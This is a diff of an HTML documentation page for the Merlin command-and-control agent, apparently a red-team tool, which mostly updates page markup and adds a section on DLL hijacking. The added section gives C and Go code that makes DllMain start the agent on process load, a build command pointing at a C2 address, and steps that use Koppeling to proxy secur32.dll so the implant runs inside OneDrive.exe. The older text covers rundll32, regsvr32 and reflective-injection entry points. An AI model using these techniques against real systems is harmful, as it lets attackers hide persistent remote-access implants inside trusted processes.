@@ -1,10 +1,11 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html4" lang="en" >
+<html class="writer-html5" lang="en" >
 <head>
   <meta charset="utf-8">
-  
+  <meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />
+
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
   <title>DLL Agent &mdash; Merlin BETA documentation</title>
@@ -13,6 +14,8 @@
   
   <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
 
   
   
@@ -26,10 +29,9 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
-        <script type="text/javascript" src="../_static/jquery.js"></script>
-        <script type="text/javascript" src="../_static/underscore.js"></script>
-        <script type="text/javascript" src="../_static/doctools.js"></script>
-        <script type="text/javascript" src="../_static/language_data.js"></script>
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/sphinx_highlight.js"></script>
     
     <script type="text/javascript" src="../_static/js/theme.js"></script>
 
@@ -86,24 +88,25 @@
               
             
             
-              <p class="caption"><span class="caption-text">Quick Start</span></p>
+              <p class="caption" role="heading"><span class="caption-text">Quick Start</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../quickStart/server.html">Merlin Server</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../quickStart/agent.html">Merlin Agent</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../quickStart/faq.html">FAQ</a></li>
 </ul>
-<p class="caption"><span class="caption-text">Merlin Agent</span></p>
+<p class="caption" role="heading"><span class="caption-text">Merlin Agent</span></p>
 <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="cli.html">Command Line Flags</a></li>
 <li class="toctree-l1 current"><a class="current reference internal" href="#">DLL Agent</a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#creating-the-dll">Creating the DLL</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#dll-entry-points">DLL Entry Points</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#execution-with-rundll32-exe">Execution with rundll32.exe</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#dll-hijacking-proxying-with-the-merlin-dll-agent">DLL Hijacking/Proxying with the Merlin DLL Agent</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="custom.html">Custom Build</a></li>
 </ul>
-<p class="caption"><span class="caption-text">Merlin Server</span></p>
+<p class="caption" role="heading"><span class="caption-text">Merlin Server</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../server/menu/main.html">Main Menu</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../server/menu/agents.html">Agent Menu</a></li>
@@ -111,11 +114,11 @@
 <li class="toctree-l1"><a class="reference internal" href="../server/menu/modules.html">Modules Menu</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
 </ul>
-<p class="caption"><span class="caption-text">Modules</span></p>
+<p class="caption" role="heading"><span class="caption-text">Modules</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
 </ul>
-<p class="caption"><span class="caption-text">Misc.</span></p>
+<p class="caption" role="heading"><span class="caption-text">Misc.</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../misc/contrib.html">Contributing</a></li>
@@ -185,8 +188,8 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
             
-  <div class="section" id="dll-agent">
-<h1>DLL Agent<a class="headerlink" href="#dll-agent" title="Permalink to this headline">¶</a></h1>
+  <section id="dll-agent">
+<h1>DLL Agent<a class="headerlink" href="#dll-agent" title="Permalink to this heading">¶</a></h1>
 <p>The Merlin Agent can be compiled into a DLL using the <a class="reference external" href="https://github.com/Ne0nd0g/merlin-agent-dll">https://github.com/Ne0nd0g/merlin-agent-dll</a> repository.
 The <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code> file is a very simple C file with a single function.
 The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> and <code class="docutils literal notranslate"><span class="pre">Run</span></code> functions are exported to facilitate executing the DLL.</p>
@@ -195,84 +198,147 @@ The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span>
 Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> requires no modification to run Merlin’s DLL with Invoke-ReflectivePEInjection.</p>
 <p>If the DLL is compiled on Windows, the <a class="reference external" href="http://tdm-gcc.tdragon.net/download">TDM-GCC</a> 64bit compiler has proven to work well during testing.</p>
 <p>If the DLL is compiled on Linux, ensure <code class="docutils literal notranslate"><span class="pre">MinGW-w64</span></code> is installed.</p>
-<div class="section" id="creating-the-dll">
-<h2>Creating the DLL<a class="headerlink" href="#creating-the-dll" title="Permalink to this headline">¶</a></h2>
+<section id="creating-the-dll">
+<h2>Creating the DLL<a class="headerlink" href="#creating-the-dll" title="Permalink to this heading">¶</a></h2>
 <p>The DLL can be created using the Make file with <code class="docutils literal notranslate"><span class="pre">make</span></code></p>
 <p>Alternatively, it can be compiled without Make by following these steps:</p>
 <ul class="simple">
-<li><dl class="first docutils">
-<dt>Create the required C archive file:</dt>
-<dd><code class="docutils literal notranslate"><span class="pre">go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">main.go</span></code></dd>
+<li><dl class="simple">
+<dt>Create the required C archive file:</dt><dd><p><code class="docutils literal notranslate"><span class="pre">go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">main.go</span></code></p>
+</dd>
 </dl>
 </li>
-<li><dl class="first docutils">
-<dt>Compile the DLL</dt>
-<dd><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-shared</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">merlin.dll</span> <span class="pre">merlin.c</span> <span class="pre">main.a</span> <span class="pre">-lwinmm</span> <span class="pre">-lntdll</span> <span class="pre">-lws2_32</span></code></dd>
+<li><dl class="simple">
+<dt>Compile the DLL</dt><dd><p><code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-shared</span> <span class="pre">-pthread</span> <span class="pre">-o</span> <span class="pre">merlin.dll</span> <span class="pre">merlin.c</span> <span class="pre">main.a</span> <span class="pre">-lwinmm</span> <span class="pre">-lntdll</span> <span class="pre">-lws2_32</span></code></p>
+</dd>
 </dl>
 </li>
 </ul>
 <p>You will now have DLL file that you can use with whatever method of execution you would like.</p>
-</div>
-<div class="section" id="dll-entry-points">
-<h2>DLL Entry Points<a class="headerlink" href="#dll-entry-points" title="Permalink to this headline">¶</a></h2>
+</section>
+<section id="dll-entry-points">
+<h2>DLL Entry Points<a class="headerlink" href="#dll-entry-points" title="Permalink to this heading">¶</a></h2>
 <p>This table catalogs the exported functions for <code class="docutils literal notranslate"><span class="pre">merlin.dll</span></code> that can be used as an entry point when executing the DLL.</p>
-<table border="1" class="colwidths-auto docutils" id="id1">
+<table class="docutils align-default" id="id1">
 <caption><span class="caption-text">Exported DLL Functions</span><a class="headerlink" href="#id1" title="Permalink to this table">¶</a></caption>
-<thead valign="bottom">
-<tr class="row-odd"><th class="head">Exported Function</th>
-<th class="head">Status</th>
-<th class="head">Notes</th>
+<thead>
+<tr class="row-odd"><th class="head"><p>Exported Function</p></th>
+<th class="head"><p>Status</p></th>
+<th class="head"><p>Notes</p></th>
 </tr>
 </thead>
-<tbody valign="top">
-<tr class="row-even"><td>Run</td>
-<td>Working</td>
-<td>Main function to execute Merlin agent</td>
+<tbody>
+<tr class="row-even"><td><p>Run</p></td>
+<td><p>Working</p></td>
+<td><p>Main function to execute Merlin agent</p></td>
 </tr>
-<tr class="row-odd"><td>DllInstall</td>
-<td>Partial</td>
-<td>Used with regsvr32.exe /i . Handling for <code class="docutils literal notranslate"><span class="pre">/i</span></code> not implemented</td>
+<tr class="row-odd"><td><p>DllInstall</p></td>
+<td><p>Partial</p></td>
+<td><p>Used with regsvr32.exe /i . Handling for <code class="docutils literal notranslate"><span class="pre">/i</span></code> not implemented</p></td>
 </tr>
-<tr class="row-even"><td>DllRegisterServer</td>
-<td>Working</td>
-<td>Used with regsvr32.exe</td>
+<tr class="row-even"><td><p>DllRegisterServer</p></td>
+<td><p>Working</p></td>
+<td><p>Used with regsvr32.exe</p></td>
 </tr>
-<tr class="row-odd"><td>DllUnregisterServer</td>
-<td>Working</td>
-<td>Used with regsvr32.exe /u</td>
+<tr class="row-odd"><td><p>DllUnregisterServer</p></td>
+<td><p>Working</p></td>
+<td><p>Used with regsvr32.exe /u</p></td>
 </tr>
-<tr class="row-even"><td>ReflectiveLoader</td>
-<td>Removed</td>
-<td>Used with Metasploit’s windows/manage/reflective_dll_inject module</td>
+<tr class="row-even"><td><p>ReflectiveLoader</p></td>
+<td><p>Removed</p></td>
+<td><p>Used with Metasploit’s windows/manage/reflective_dll_inject module</p></td>
 </tr>
-<tr class="row-odd"><td>Magic</td>
-<td>Working</td>
-<td>Exported function in <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code>; used with sRDI or any other method</td>
+<tr class="row-odd"><td><p>Magic</p></td>
+<td><p>Working</p></td>
+<td><p>Exported function in <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code>; used with sRDI or any other method</p></td>
 </tr>
-<tr class="row-even"><td>Merlin</td>
-<td>Working</td>
-<td>Exported function in <code class="docutils literal notranslate"><span class="pre">main.go</span></code></td>
+<tr class="row-even"><td><p>Merlin</p></td>
+<td><p>Working</p></td>
+<td><p>Exported function in <code class="docutils literal notranslate"><span class="pre">main.go</span></code></p></td>
 </tr>
-<tr class="row-odd"><td>VoidFunc</td>
-<td>Working</td>
-<td>Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1</td>
+<tr class="row-odd"><td><p>VoidFunc</p></td>
+<td><p>Working</p></td>
+<td><p>Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1</p></td>
 </tr>
 </tbody>
 </table>
-</div>
-<div class="section" id="execution-with-rundll32-exe">
-<h2>Execution with rundll32.exe<a class="headerlink" href="#execution-with-rundll32-exe" title="Permalink to this headline">¶</a></h2>
+</section>
+<section id="execution-with-rundll32-exe">
+<h2>Execution with rundll32.exe<a class="headerlink" href="#execution-with-rundll32-exe" title="Permalink to this heading">¶</a></h2>
 <p>The DLL can be executed on a Windows host using the rundll32.exe program. Examples of using <code class="docutils literal notranslate"><span class="pre">rundll32</span></code> are:</p>
 <ul class="simple">
-<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span></code></li>
-<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Merlin</span></code></li>
-<li><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Magic</span></code></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Merlin</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Magic</span></code></p></li>
 </ul>
 <p>A different Merlin server <em>can</em> be provided when executing the DLL by supplying the target URL as an argument. An example is:</p>
 <p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span> <span class="pre">https://yourdomian.com:443/</span></code></p>
 <p><strong>NOTE:</strong> Passing a custom URL only works when using cmd.exe and fails when using powershell.exe</p>
+</section>
+<section id="dll-hijacking-proxying-with-the-merlin-dll-agent">
+<h2>DLL Hijacking/Proxying with the Merlin DLL Agent<a class="headerlink" href="#dll-hijacking-proxying-with-the-merlin-dll-agent" title="Permalink to this heading">¶</a></h2>
+<p>With a little bit of setup, the Merlin DLL agent can be used for DLL Hijacking / Side-loading / Proxying. This is a great technique to get the Merlin agent running in the codespace of a trusted process.</p>
+<p>The specifics on choosing an executable for DLL proxying are outside the scope of this documentation. Assume that a candidate executable has been identified.</p>
+<p>In the <code class="docutils literal notranslate"><span class="pre">merlin-agent-dll</span></code> repo, add a new exported function with an arbitrary name to <code class="docutils literal notranslate"><span class="pre">main.go</span></code>. Have this function execute the <code class="docutils literal notranslate"><span class="pre">run</span></code> function with the <code class="docutils literal notranslate"><span class="pre">url</span></code> argument:</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="o">...</span><span class="p">[</span><span class="nx">SNIP</span><span class="p">]</span><span class="o">...</span>
+
+<span class="c1">// EXPORTED FUNCTIONS</span>
+
+<span class="c1">// MagicMan is a test function</span>
+<span class="c1">//</span>
+<span class="c1">//export MagicMan</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">MagicMan</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">run</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="o">...</span><span class="p">[</span><span class="nx">SNIP</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
 </div>
+<p>Note that the name of the exported function must match in the comment block and the code itself or Go will complain during compilation.</p>
+<p>Now, in the <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code> source code, add a new function that executes the exported function from <code class="docutils literal notranslate"><span class="pre">main.go</span></code>:</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+
+<span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">RunMagicMan</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">LpParam</span><span class="p">){</span>
+<span class="w">    </span><span class="c1">//MessageBoxA( NULL, &quot;Hello from MagicMan() in Merlin&quot;, &quot;DLL Load&quot;, MB_OK );</span>
+<span class="w">    </span><span class="n">MagicMan</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</pre></div>
 </div>
+<p>Next, edit the structure of <code class="docutils literal notranslate"><span class="pre">DllMain</span></code> entry point. We want to create a thread that will execute the Merlin agent function when the DLL is side-loaded into the process:</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+
+<span class="n">BOOL</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span>
+<span class="w">    </span><span class="n">HINSTANCE</span><span class="w"> </span><span class="n">hinstDLL</span><span class="p">,</span><span class="w">  </span><span class="c1">// handle to DLL module</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">fdwReason</span><span class="p">,</span><span class="w">     </span><span class="c1">// reason for calling function</span>
+<span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="c1">// reserved</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// Perform actions based on the reason for calling.</span>
+<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="w"> </span><span class="n">fdwReason</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+<span class="w">            </span><span class="c1">//MessageBoxA( NULL, &quot;Hello from DllMain-PROCESS_ATTACH in Merlin!&quot;, &quot;DLL Load&quot;, MB_OK );</span>
+<span class="w">            </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">RunMagicMan</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">            </span><span class="k">break</span><span class="p">;</span>
+
+<span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</pre></div>
+</div>
+<p>Now, when the Merlin DLL Agent is loaded by a trusted process, the DLL entry point will run the CreateThread function and execute the agent.</p>
+<p>Build the DLL agent with the merlin-agent-dll makefile and supply your desired URL, PSK, and protocol parameters:</p>
+<p><code class="docutils literal notranslate"><span class="pre">husky&#64;dev-kde:~/merlin-agent-dll$</span> <span class="pre">make</span> <span class="pre">URL=http://10.10.1.237:8443</span> <span class="pre">PSK=merlin</span> <span class="pre">PROTO=http</span></code></p>
+<p>Let’s assume that we’re targeting the OneDrive.exe program for our DLL Proxy. We know that OneDrive.exe loads <code class="docutils literal notranslate"><span class="pre">secur32.dll</span></code> from the present working directory during execution.</p>
+<p>We can now use a tool like Koppelling to create a proxied DLL:</p>
+<p><code class="docutils literal notranslate"><span class="pre">PS</span> <span class="pre">C:\Users\Matt\Desktop\Koppeling&gt;</span> <span class="pre">.\NetClone.exe</span> <span class="pre">--target</span> <span class="pre">'C:\Users\Matt\Desktop\merlin.dll'</span> <span class="pre">--reference</span> <span class="pre">'C:\Windows\system32\secur32.dll'</span> <span class="pre">--output</span> <span class="pre">'C:\Users\Matt\Desktop\secur32.dll'</span></code></p>
+<p>Then, we endeavor to drop our proxied DLL into the OneDrive application directory. Luckily for us, this is in %APPDATA% and we can write to the directory:</p>
+<p><code class="docutils literal notranslate"><span class="pre">C:\Users\Matt\AppData\Local\Microsoft\OneDrive</span></code></p>
+<p>When the application starts, our proxied DLL is pulled into the process and a thread is executed. Our session is established and our agent lives inside the OneDrive.exe process:</p>
+<img alt="DLL Proxy 1" class="align-center" src="../_images/dll-proxy-1.png" />
+<img alt="DLL Proxy 2" class="align-center" src="../_images/dll-proxy-2.png" />
+</section>
+</section>
 
 
            </div>
